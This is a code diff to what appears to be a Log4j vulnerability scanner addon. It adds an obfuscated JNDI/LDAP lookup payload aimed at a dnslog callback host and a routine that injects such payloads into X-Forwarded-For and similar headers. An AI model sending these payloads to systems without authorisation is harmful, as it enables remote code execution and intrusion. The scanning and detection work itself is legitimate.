@@ -9,6 +9,7 @@ from lib.core.enums import VulType
 from lib.core.enums import VulLevel
 from addon.agent import AgentAddon
 from lib.util.util import random_lowercase_digits
+from lib.util.util import ip_header
 from lib.util.aiohttputil import ClientSession
 
 class Addon(AgentAddon):
@@ -33,6 +34,7 @@ class Addon(AgentAddon):
             # "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{dnslog}/test9}",
             # "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{dnslog}/test11}",
             # "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://{dnslog}/test10}",
+            # "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{dnslog}:1389/test}"
             # "${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-l}${env:aaaa:-d}${env:aaaa:-a}${env:aaaa:-p}${env:aaaa:-:}//{dnslog}/test5}",
             # "${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-r}${env:aaaa:-m}${env:aaaa:-i}${env:aaaa:-:}//{dnslog}/test6}",
             # "${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-d}${env:aaaa:-n}${env:aaaa:-s}${env:aaaa:-:}//{dnslog}/test7}",
@@ -136,6 +138,15 @@ class Addon(AgentAddon):
                     if await self.prove_log4j(keyword, method, url, data, temp_headers):
                         return
 
+            # 单发一个带x-forwarded-for的随机header
+            if "X-Forwarded-For" not in headers.keys():
+                async for payload, keyword in self.generate_payload():
+                    temp_headers = deepcopy(headers)
+                    for key in ip_header().keys():
+                        if key not in temp_headers.keys():
+                            temp_headers[key] = payload
+                    if await self.prove_log4j(keyword, method, url, data, temp_headers):
+                        return
 
     async def prove_log4j(self, keyword, method, url, data, headers):
         async with ClientSession(self.addon_path) as session:
